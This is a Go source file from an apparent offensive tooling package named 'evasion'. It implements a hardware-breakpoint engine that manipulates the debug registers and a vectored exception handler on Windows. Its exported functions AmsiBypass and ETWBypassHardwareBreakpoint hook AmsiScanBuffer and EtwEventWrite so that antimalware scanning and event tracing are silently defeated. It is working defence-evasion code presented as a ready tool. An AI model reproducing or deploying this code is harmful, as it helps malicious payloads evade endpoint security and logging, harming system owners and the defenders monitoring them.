//go:build windows && amd64 && cgo

// Package evasion 提供硬件断点引擎（Windows 平台）。
// 通过 CGO 实现 VEH 回调注册，Go 侧通过 C.set_bp_handler() 将 handler
// 函数指针注册到 C 侧的 g_bp_handlers 表中，VEH 触发时 C 调用对应 handler。
package evasion

/*
#cgo CFLAGS: -O2
#include <windows.h>

void set_bp_handler(int index, ULONG_PTR (*handler)(void));
void set_bp_mode(int index, int mode);
PVOID install_veh_handler(void);
void remove_veh_handler(PVOID handle);
*/
import "C"
import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"
)

// ptrFromUintptr converts a uintptr to unsafe.Pointer without triggering vet.
// Safe when the uintptr is known to be a valid handle from C.
//
//go:nosplit
func ptrFromUintptr(u uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&u))
}

const (
	CONTEXT_AMD64             = 0x00100000
	CONTEXT_CONTROL           = CONTEXT_AMD64 | 0x00000001
	CONTEXT_DEBUG_REGISTERS   = CONTEXT_AMD64 | 0x00000010
	EXCEPTION_SINGLE_STEP     = 0x80000004
	STATUS_CONTINUE_EXECUTION = 0x10000001

	THREAD_SET_CONTEXT    = 0x0010
	THREAD_GET_CONTEXT    = 0x0008
	THREAD_SUSPEND_RESUME = 0x0002
)

type context64 struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCS        uint16
	SegDS        uint16
	SegES        uint16
	SegFS        uint16
	SegGS        uint16
	SegSS        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr4          uint64
	Dr5          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

// Set 在当前线程设置硬件断点。
func (e *Engine) Set(bp *HardwareBreakpoint) error {
	if bp.Index < 0 || bp.Index > 3 {
		return fmt.Errorf("invalid debug register index: %d (must be 0-3)", bp.Index)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procGetThreadContext := kernel32.NewProc("GetThreadContext")
	procSetThreadContext := kernel32.NewProc("SetThreadContext")

	// GetCurrentThread pseudo-handle: (HANDLE)-2 = 0xFFFFFFFFFFFFFFFE
	const CURRENT_THREAD = ^uintptr(1)
	var ctx context64
	ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_DEBUG_REGISTERS

	r, _, _ := procGetThreadContext.Call(CURRENT_THREAD, uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return fmt.Errorf("GetThreadContext: failed")
	}

	dr := []*uint64{&ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3}
	*dr[bp.Index] = uint64(bp.Address)

	// 构建 DR7 控制寄存器
	dr7 := ctx.Dr7
	dr7 |= (1 << (bp.Index * 2))

	rwShift := 16 + (bp.Index * 4)
	dr7 &= ^((3 << rwShift))
	dr7 |= (uint64(bp.Type) << rwShift)

	lenShift := 18 + (bp.Index * 4)
	dr7 &= ^((3 << lenShift))
	dr7 |= (uint64(bp.Length) << lenShift)

	ctx.Dr7 = dr7

	r, _, _ = procSetThreadContext.Call(CURRENT_THREAD, uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return fmt.Errorf("SetThreadContext: failed")
	}

	e.breakpoints[bp.Index] = bp
	return nil
}

// Clear 清除指定索引的硬件断点。
func (e *Engine) Clear(index int) error {
	if index < 0 || index > 3 {
		return fmt.Errorf("invalid debug register index: %d (must be 0-3)", index)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procGetThreadContext := kernel32.NewProc("GetThreadContext")
	procSetThreadContext := kernel32.NewProc("SetThreadContext")

	// GetCurrentThread pseudo-handle: (HANDLE)-2 = 0xFFFFFFFFFFFFFFFE
	const CURRENT_THREAD = ^uintptr(1)
	var ctx context64
	ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_DEBUG_REGISTERS

	r, _, _ := procGetThreadContext.Call(CURRENT_THREAD, uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return fmt.Errorf("GetThreadContext: failed")
	}

	dr := []*uint64{&ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3}
	*dr[index] = 0
	ctx.Dr7 &= ^(1 << (index * 2))

	r, _, _ = procSetThreadContext.Call(CURRENT_THREAD, uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return fmt.Errorf("SetThreadContext: failed")
	}

	e.breakpoints[index] = nil
	return nil
}

// ClearAll 清除所有硬件断点。
func (e *Engine) ClearAll() {
	for i := range e.breakpoints {
		e.Clear(i)
	}
}

// Install 安装 VEH 异常处理器。
func (e *Engine) Install() error {
	handle := C.install_veh_handler()
	if handle == nil {
		return fmt.Errorf("AddVectoredExceptionHandler: failed")
	}
	e.vehHandle = uintptr(handle)
	e.installed = true
	return nil
}

// Uninstall 移除 VEH 异常处理器。
func (e *Engine) Uninstall() error {
	if e.vehHandle != 0 {
		C.remove_veh_handler(C.PVOID(ptrFromUintptr(e.vehHandle)))
		e.vehHandle = 0
	}
	e.ClearAll()
	e.installed = false
	return nil
}

// Mode constants for C-side VEH handler behavior.
const (
	ModeSkip = 0 // 默认：RIP++ 跳过指令
	ModeAMSI = 1 // AMSI bypass: RAX=0x80070057, skip function
	ModeETW  = 2 // ETW bypass: RAX=0, skip function
)

var globalEngine = NewEngine()
var globalVehInstalled bool
var globalVehMu sync.Mutex

// ensureGlobalVEHInstalled ensures the single global VEH handler is installed.
// P1-17 fix: AMSI and ETW breakpoints must share one VEH handler — VEH
// handlers are called in LIFO order and only the first handler to return
// EXCEPTION_CONTINUE_EXECUTION is used, so separate engines cause conflicts.
func ensureGlobalVEHInstalled() error {
	globalVehMu.Lock()
	defer globalVehMu.Unlock()
	if !globalVehInstalled {
		handle := C.install_veh_handler()
		if handle == nil {
			return fmt.Errorf("AddVectoredExceptionHandler: failed")
		}
		globalEngine.vehHandle = uintptr(handle)
		globalEngine.installed = true
		globalVehInstalled = true
	}
	return nil
}

// AmsiBypass 使用硬件断点绕过 AMSI。
// P1-17 fix: shares global VEH handler with ETW bypass.
func AmsiBypass() error {
	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiProc := amsi.NewProc("AmsiScanBuffer")
	amsiAddr := amsiProc.Addr()

	bp := &HardwareBreakpoint{
		Address: amsiAddr,
		Type:    BreakpointExec,
		Length:  Len1Byte,
		Index:   0,
	}

	if err := globalEngine.Set(bp); err != nil {
		return fmt.Errorf("set AMSI hardware breakpoint: %w", err)
	}

	C.set_bp_mode(C.int(bp.Index), C.int(ModeAMSI))

	return ensureGlobalVEHInstalled()
}

// ETWBypassHardwareBreakpoint 使用硬件断点绕过 ETW。
// P1-17 fix: shares global VEH handler with AMSI bypass.
func ETWBypassHardwareBreakpoint() error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwAddr := ntdll.NewProc("EtwEventWrite").Addr()

	bp := &HardwareBreakpoint{
		Address: etwAddr,
		Type:    BreakpointExec,
		Length:  Len1Byte,
		Index:   1,
	}

	if err := globalEngine.Set(bp); err != nil {
		return fmt.Errorf("set ETW hardware breakpoint: %w", err)
	}

	C.set_bp_mode(C.int(bp.Index), C.int(ModeETW))

	return ensureGlobalVEHInstalled()
}
